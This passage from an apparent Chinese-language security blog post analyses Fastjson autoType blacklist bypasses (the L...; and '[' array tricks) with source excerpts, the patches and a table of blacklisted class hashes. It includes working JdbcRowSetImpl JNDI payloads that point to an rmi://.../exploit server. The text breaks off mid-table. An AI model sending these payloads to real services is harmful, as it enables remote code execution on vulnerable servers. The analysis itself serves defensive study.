&#x27;L&#x27; &#x27;L&#x27;（即以 &quot;LL&quot; 开头）</span></span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))                  <span class="comment">// c0</span></span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">1</span>))                  <span class="comment">// c1</span></span><br><span class="line">            * PRIME == <span class="number">0x09195c07b5af5345L</span>)         <span class="comment">// 命中 &quot;LL...&quot; 的特征</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对 &quot;LL...;&quot; 这种“双层 L 包裹”的写法直接拒绝：</span></span><br><span class="line">        <span class="comment">// 这是为了防止“只剥一层 L...; 后仍然是 L...;”的绕过（例如 &quot;LLFoo;;&quot;）</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 走到这里，说明外层是 &quot;L...;&quot;，但不是 &quot;LL...;&quot;</span></span><br><span class="line">    <span class="comment">// 于是进行“规范化”：去掉首尾的 L 和 ;，把描述符形式还原为普通类名</span></span><br><span class="line">    <span class="comment">// 例如：Lcom/sun/rowset/JdbcRowSetImpl; -&gt; com/sun/rowset/JdbcRowSetImpl</span></span><br><span class="line">    <span class="comment">// 后续再配合把 &#x27;/&#x27; 转为 &#x27;.&#x27;，进入常规黑/白名单匹配</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样使用 <code>L</code>、<code>;</code> 绕过黑名单的思路就被阻挡了。</p>
<h3 id="数组类型绕过（1-2-25-1-2-43）"><a href="#数组类型绕过（1-2-25-1-2-43）" class="headerlink" title="数组类型绕过（1.2.25 - 1.2.43）"></a>数组类型绕过（1.2.25 - 1.2.43）</h3><p>在 <code>loadClass</code> 的过程中，还针对 <code>[</code> 也进行了处理和递归：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Step 2: 如果是数组类型（以 [ 开头）</span></span><br><span class="line"><span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 递归加载数组的组件类型</span></span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="comment">// 构造一个 0 长度的数组对象，返回它的 Class 类型</span></span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此可以利用 <code>[</code> 进行黑名单的绕过：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Fastjson 在早期版本（比如 1.2.42&#x2F;43）里，专门对 <code>@type</code> 做了扩展：</p>
<ul>
<li><p>如果 <code>@type</code> 的值是一个以 <code>[</code> 开头的字符串，例如：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[com.foo.Bar&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Fastjson 会把它理解为 <strong>“数组类型声明”</strong>，即 <code>com.foo.Bar[]</code>。</p>
</li>
<li><p>这时候，**紧跟着的 <code>[</code>**（没有逗号、没有结束分隔）会被 Fastjson 容错解析为 <strong>这个数组类型的实际数组值</strong>。</p>
</li>
</ul>
<p>也就是说：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span>...<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></div>

<p>在 Fastjson 的解析逻辑里被拆成：</p>
<ol>
<li><code>@type = &quot;[com.sun.rowset.JdbcRowSetImpl&quot;</code> → 类型是 <code>JdbcRowSetImpl[]</code>；</li>
<li><code>[{...}]</code> → 这是数组的具体元素（里面放一个对象，字段 <code>dataSourceName</code>、<code>autoCommit</code>）。</li>
</ol>
<p>在有些资料中，上述 payload 会被写成错误格式，例如：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">,</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>但是由于 FastJson 的解析顺序问题，<code>JdbcRowSetImpl</code> 对象依旧可以被实例化。</p>

    </div>
  </div>

<p>FastJson 在 1.2.43 版本修复了上一个版本中使用 <code>[</code> 绕过黑名单防护的问题。</p>
<p>可以看到在 <code>checkAutoType</code> 中添加了新的判断，如果类名以 <code>[</code> 开始则直接抛出异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FNV-1a 64 位哈希的固定参数</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>; <span class="comment">// FNV offset_basis（初始值）</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;      <span class="comment">// FNV prime（乘子）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先把“首字符”滚入哈希：h1 = ((BASIC ^ firstChar) * PRIME) mod 2^64</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 【规则 1】若 h1 等于 0xaf64164c86024f1aL，则立即拒绝</span></span><br><span class="line"><span class="comment">// 说明：0xaf64164c86024f1aL 恰好是 FNV-1a 计算 ((BASIC ^ &#x27;[&#x27;) * PRIME) 的结果，</span></span><br><span class="line"><span class="comment">// 也就是“首字符为 &#x27;[&#x27; ”的特征指纹。&#x27;[&#x27; 是 JVM 类型描述符里“数组类型”的起始标志，</span></span><br><span class="line"><span class="comment">// 比如：[I、[Ljava/lang/String;、[[Lcom/xx/YY; 等。</span></span><br><span class="line"><span class="comment">// —— 触发这里代表传入的是“数组描述符”风格，直接抛异常阻断数组绕过。</span></span><br><span class="line"><span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// &#x27;[&#x27;</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 【规则 2】若 ((h1 ^ lastChar) * PRIME) 等于 0x9198507b5af98f0L，则立即拒绝</span></span><br><span class="line"><span class="comment">// 说明：0x9198507b5af98f0L 是 FNV-1a 计算 (((BASIC ^ &#x27;L&#x27;) * PRIME) ^ &#x27;;&#x27;) * PRIME 的结果，</span></span><br><span class="line"><span class="comment">// 也就是说：首字符为 &#x27;L&#x27; 且末字符为 &#x27;;&#x27; —— JVM “对象类型描述符” 的典型包裹形式：L...;</span></span><br><span class="line"><span class="comment">// 例如：Lcom/sun/rowset/JdbcRowSetImpl;。</span></span><br><span class="line"><span class="comment">// —— 触发这里代表传入的是“对象描述符”风格，同样直接抛异常阻断利用。</span></span><br><span class="line"><span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="基于黑名单外的类绕过"><a href="#基于黑名单外的类绕过" class="headerlink" title="基于黑名单外的类绕过"></a>基于黑名单外的类绕过</h2><p>这里主要是通过寻找黑名单之外的类进行绕过。</p>
<p>FastJson 1.2.42 引入了哈希机制，下面是目前已知的黑名单列表：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>33238344207745342</td>
<td>0x761619136cc13eL</td>
<td>bsh</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-8720046426850100497</td>
<td>0x86fc2bf9beaf7aefL</td>
<td>org.apache.commons.collections4.comparators</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-8109300701639721088</td>
<td>0x8f75f9fa0df03f80L</td>
<td>org.python.core</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7966123100503199569</td>
<td>0x9172a53f157930afL</td>
<td>org.apache.tomcat</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7766605818834748097</td>
<td>0x9437792831df7d3fL</td>
<td>org.apache.xalan</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-6835437086156813536</td>
<td>0xa123a62f93178b20L</td>
<td>javax.xml</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4837536971810737970</td>
<td>0xbcdd9dc12766f0ceL</td>
<td>org.springframework.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4082057040235125754</td>
<td>0xc7599ebfe3e72406L</td>
<td>org.apache.commons.beanutils</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-2364987994247679115</td>
<td>0xdf2ddff310cdb375L</td>
<td>org.apache.commons.collections.Transformer</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-1872417015366588117</td>
<td>0xe603d6a51fad692bL</td>
<td>org.codehaus.groovy.runtime</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-254670111376247151</td>
<td>0xfc773ae20c827691L</td>
<td>java.lang.Thread</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-190281065685395680</td>
<td>0xfd5bfc610056d720L</td>
<td>javax.net.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>313864100207897507</td>
<td>0x45b11bc78a3aba3L</td>
<td>com.mchange</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1203232727967308606</td>
<td>0x10b2bdca849d9b3eL</td>
<td>org.apache.wicket.util</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1502845958873959152</td>
<td>0x14db2e6fead04af0L</td>
<td>java.util.jar.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3547627781654598988</td>
<td>0x313bb4abd8d4554cL</td>
<td>org.mozilla.javascript</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3730752432285826863</td>
<td>0x33c64b921f523f2fL</td>
<td>java.rmi</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3794316665763266033</td>
<td>0x34a81ee78429fdf1L</td>
<td>java.util.prefs.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>4147696707147271408</td>
<td>0x398f942e01920cf0L</td>
<td>com.sun.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5347909877633654828</td>
<td>0x4a3797b30328202cL</td>
<td>java.util.logging.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5450448828334921485</td>
<td>0x4ba3e254e758d70dL</td>
<td>org.apache.bcel</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5751393439502795295</td>
<td>0x4fd10ddc6d13821fL</td>
<td>java.net.Socket</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5944107969236155580</td>
<td>0x527db6b46ce3bcbcL</td>
<td>org.apache.commons.fileupload</td>
</tr>
<tr>
<td>1.2.42</td>
<td>6742705432718011780</td>
<td>0x5d92e6ddde40ed84L</td>
<td>org.jboss</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7179336928365889465</td>
<td>0x63a220e60a17c7b9L</td>
<td>org.hibernate</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7442624256860549330</td>
<td>0x6749835432e0f0d2L</td>
<td>org.apache.commons.collections.functors</td>
</tr>
<tr>
<td>1.2.42</td>
<td>8838294710098435315</td>
<td>0x7aa7ee3627a19cf3L</td>
<td>org.apache.myfaces.context.servlet</td>
</tr>
<tr>
<td>1.2.43</td>
<td>-2262244760619952081</td>
<td>0xe09ae4604842582fL</td>
<td>java.net.URL</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8165637398350707645</td>
<td>0x8eadd40cb2a94443L</td>
<td>junit.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8083514888460375884</td>
<td>0x8fd1960988bce8b4L</td>
<td>org.apache.ibatis.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7921218830998286408</td>
<td>0x92122d710e364fb8L</td>
<td>org.osjava.sj.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7768608037458185275</td>
<td>0x94305c26580f73c5L</td>
<td>org.apache.log4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-6179589609550493385</td>
<td>0xaa3daffdb10c4937L</td>
<td>org.logicalcobwebs.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-5194641081268104286</td>
<td>0xb7e8ed757f5d13a2L</td>
<td>org.apache.logging.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-3935185854875733362</td>
<td>0xc963695082fd728eL</td>
<td>org.apache.commons.dbcp</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-2753427844400776271</td>
<td>0xd9c9dbf6bbd27bb1L</td>
<td>com.ibatis.sqlmap.engine.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-1589194880214235129</td>
<td>0xe9f20bad25f60807L</td>
<td>org.jdom.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>1073634739308289776</td>
<td>0xee6511b66fd5ef0L</td>
<td>org.slf4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>5688200883751798389</td>
<td>0x4ef08c90ff16c675L</td>
<td>javassist.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>7017492163108594270</td>
<td>0x616323f12c2ce25eL</td>
<td>oracle.net</td>
</tr>
<tr>
<td>1.2.46</td>
<td>8389032537095247355</td>
<td>0x746bd4a53ec195fbL</td>
<td>org.jaxen.</td>
</tr>
<tr>
<td>1.2.48</td>
<td>1459860845934817624</td>
<td>0x144277b467723158L</td>
<td>java.net.InetAddress</td>
</tr>
<tr>
<td>1.2.48</td>
<td>8409640769019589119</td>
<td>0x74b50bb9260e31ffL</td>
<td>java.lang.Class</td>
</tr>
<tr>
<td>1.2.49</td>
<td>4904007817188630457</td>
<td>0x440e89208f445fb9L</td>
<td>com.alibaba.fastjson.annotation</td>
</tr>
<tr>
<td>1.2.59</td>
<td>5100336081510080343</td>
<td>0x46c808a4b5841f57L</td>
<td>org.apache.cxf.jaxrs.provider.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>6456855723474196908</td>
<td>0x599b5c1213a099acL</td>
<td>ch.qos.logback.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>8537233257283452655</td>
<td>0x767a586a5107feefL</td>
<td>net.sf.ehcache.transaction.manager.</td>
</tr>
<tr>
<td>1.2.60</td>
<td>3688179072722109200</td>
<td>0x332f0b5369a18310L</td>
<td>com.zaxxer.hikari.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-4401390804044377335</td>
<td>0xc2eb1e621f439309L</td>
<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1650485814983027158</td>
<td>0xe9184be55b1d962aL</td>
<td>org.apache.openjpa.ee.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1251419154176620831</td>
<td>0xeea210e8da2ec6e1L</td>
<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-9822483067882491</td>
<td>0xffdd1a80f1ed3405L</td>
<td>com.mysql.cj.jdbc.admin.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>99147092142056280</td>
<td>0x1603dc147a3e358L</td>
<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
</tr>
<tr>
<td>1.2.61</td>
<td>3114862868117605599</td>
<td>0x2b3a37467a344cdfL</td>
<td>org.apache.ibatis.parsing.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>4814658433570175913</td>
<td>0x42d11a560fc9fba9L</td>
<td>org.apache.axis2.jaxws.spi.handler.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>6511035576063254270</td>
<td>0x5a5bd85c072e5efeL</td>
<td>jodd.db.connection.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>8925522461579647174</td>
<td>0x7bddd363ad3998c6L</td>
<td>org.apache.commons.configuration.JNDIConfiguration</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-9164606388214699518</td>
<td>0x80d0c70bcc2fea02L</td>
<td>org.apache.ibatis.executor.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-8649961213709896794</td>
<td>0x87f52a1b07ea33a6L</td>
<td>net.sf.cglib.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-6316154655839304624</td>
<td>0xa85882ce1044c450L</td>
<td>oracle.net.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-5764804792063216819</td>
<td>0xafff4c95b99a334dL</td>
<td>com.mysql.cj.jdbc.MysqlDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4608341446948126581</td>
<td>0xc00be1debaf2808bL</td>
<td>jdk.internal.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4438775680185074100</td>
<td>0xc2664d0958ecfe4cL</td>
<td>aj.org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-3319207949486691020</td>
<td>0xd1efcdf4b3316d34L</td>
<td>oracle.jdbc.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2192804397019347313</td>
<td>0xe1919804d5bf468fL</td>
<td>org.apache.commons.collections.comparators.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2095516571388852610</td>
<td>0xe2eb3ac7e56c467eL</td>
<td>net.sf.ehcache.hibernate.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4750336058574309</td>
<td>0x10e067cd55c5e5L</td>
<td>com.mysql.cj.log.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>218512992947536312</td>
<td>0x3085068cb7201b8L</td>
<td>org.h2.jdbcx.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>823641066473609950</td>
<td>0xb6e292fa5955adeL</td>
<td>org.apache.commons.logging.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1534439610567445754</td>
<td>0x154b6cb22d294cfaL</td>
<td>org.apache.ibatis.reflection.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1818089308493370394</td>
<td>0x193b2697eaaed41aL</td>
<td>org.h2.server.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2164696723069287854</td>
<td>0x1e0a8c3358ff3daeL</td>
<td>org.apache.ibatis.datasource.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2653453629929770569</td>
<td>0x24d2f6048fef4e49L</td>
<td>org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2836431254737891113</td>
<td>0x275d0732b877af29L</td>
<td>flex.messaging.util.concurrent.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3089451460101527857</td>
<td>0x2adfefbbfe29d931L</td>
<td>org.apache.ibatis.javassist.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3256258368248066264</td>
<td>0x2d308dbbc851b0d8L</td>
<td>java.lang.UNIXProcess</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3718352661124136681</td>
<td>0x339a3e0b6beebee9L</td>
<td>org.apache.ibatis.ognl.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4046190361520671643</td>
<td>0x3826f4b2380c8b9bL</td>
<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4841947709850912914</td>
<td>0x43320dc9d2ae0892L</td>
<td>org.codehaus.jackson.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6280357960959217660</td>
<td>0x5728504a6d454ffcL</td>
<td>org.apache.ibatis.scripting.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6534946468240507089</td>
<td>0x5ab0cb3071ab40d1L</td>
<td>org.apache.commons.proxy.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6734240326434096246</td>
<td>0x5d74d3e5b9370476L</td>
<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>7123326897294507060</td>
<td>0x62db241274397c34L</td>
<td>org.apache.commons.collections.functors.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>8488266005336625107</td>
<td>0x75cc60f5871d0fd3L</td>
<td>org.apache.commons.configuration</td>
</tr>
<tr>
<td>1.2.66</td>
<td>-2439930098895578154</td>
<td>0xde23a0809a8b9bd6L</td>
<td>javax.script.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>-582813228520337988</td>
<td>0xf7e96e74dfa58dbcL</td>
<td>javax.sound.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>-26639035867733124</td>
<td>0xffa15bf021f1e37cL</td>
<td>javax.print.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>386461436234701831</td>
<td>0x55cfca0f2281c07L</td>
<td>javax.activation.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>1153291637701043748</td>
<td>0x100150a253996624L</td>
<td>javax.tools.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>1698504441317515818L</td>
<td>0x17924cca5227622aL</td>
<td>javax.management.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>7375862386996623731L</td>
<td>0x665c53c311193973L</td>
<td>org.apache.xbean.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>7658177784286215602L</td>
<td>0x6a47501ebb2afdb2L</td>
<td>org.eclipse.jetty.</td>
</tr>
<tr>
<td>1.2.66</td>
<td>8055461369741094911L</td>
<td>0x6fcabf6fa54cafffL</td>
<td>javax.naming.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-7775351613326101303L</td>
<td>0x941866e73beff4c9L</td>
<td>org.apache.shiro.realm.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-6025144546313590215L</td>
<td>0xac6262f52c98aa39L</td>
<td>org.apache.http.conn.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-5939269048541779808L</td>
<td>0xad937a449831e8a0L</td>
<td>org.quartz.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-5885964883385605994L</td>
<td>0xae50da1fad60a096L</td>
<td>com.taobao.eagleeye.wrapper</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-3975378478825053783L</td>
<td>0xc8d49e5601e661a9L</td>
<td>org.apache.http.impl.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-2378990704010641148L</td>
<td>0xdefc208f237d4104L</td>
<td>com.ibatis.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-905177026366752536L</td>
<td>0xf3702a4a5490b8e8L</td>
<td>org.apache.catalina.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>2660670623866180977L</td>
<td>0x24ec99d5e7dc5571L</td>
<td>org.apache.http.auth.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>2731823439467737506L</td>
<td>0x25e962f1c28f71a2L</td>
<td>br.com.anteros.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>3637939656440441093L</td>
<td>0x327c8ed7c8706905L</td>
<td>com.caucho.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>4254584350247334433L</td>
<td>0x3b0b51ecbf6db221L</td>
<td>org.apache.http.cookie.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>5274044858141538265L</td>
<td>0x49312bdafb0077d9L</td>
<td>org.javasimon.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>5474268165959054640L</td>
<td>0x4bf881e49d37f530L</td>
<td>org.apache.cocoon.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>5596129856135573697L</td>
<td>0x4da972745feb30c1L</td>
<td>org.apache.activemq.jms.pool.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>6854854816081053523L</td>
<td>0x5f215622fb630753L</td>
<td>org.mortbay.jetty.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>-3077205613010077203L</td>
<td>0xd54b91cc77b239edL</td>
<td>org.apache.shiro.jndi.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>-2825378362173150292L</td>
<td>0xd8ca3d595e982bacL</td>
<td>org.apache.ignite.cache.jta.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>2078113382421334967L</td>
<td>0x1cd6f11c6a358bb7L</td>
<td>javax.swing.J</td>
</tr>
<tr>
<td>1.2.68</td>
<td>6007332606592876737L</td>
<td>0x535e552d6f9700c1L</td>
<td>org.aoju.bus.proxy.provider.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>9140390920032557669L</td>
<td>0x7ed9311d28bf1a65L</td>
<td>java.awt.p</td>
</tr>
<tr>
<td>1.2.68</td>
<td>9140416208800006522L</td>
<td>0x7ed9481d28bf417aL</td>
<td>java.awt.i</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-8024746738719829346L</td>
<td>0x90a25f5baa21529eL</td>
<td>java.io.Serializable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-5811778396720452501L</td>
<td>0xaf586a571e302c6bL</td>
<td>java.io.Closeable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-3053747177772160511L</td>
<td>0xd59ee91f0b09ea01L</td>
<td>oracle.jms.AQ</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-2114196234051346931L</td>
<td>0xe2a8ddba03e69e0dL</td>
<td>java.util.Collection</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-2027296626235911549L</td>
<td>0xe3dd9875a2dc5283L</td>
<td>java.lang.Iterable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-2939497380989775398L</td>
<td>0xd734ceb4c3e9d1daL</td>
<td>java.lang.Object</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-1368967840069965882L</td>
<td>0xed007300a7b227c6L</td>
<td>java.lang.AutoCloseable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>2980334044947851925L</td>
<td>0x295c4605fd1eaa95L</td>
<td>java.lang.Readable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>3247277300971823414L</td>
<td>0x2d10a5801b9d6136L</td>
<td>java.lang.Cloneable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>5183404141909004468L</td>
<td>0x47ef269aadc650b4L</td>
<td>java.lang.Runnable</td>
</tr>
<tr>
<td>1.2.69</td>
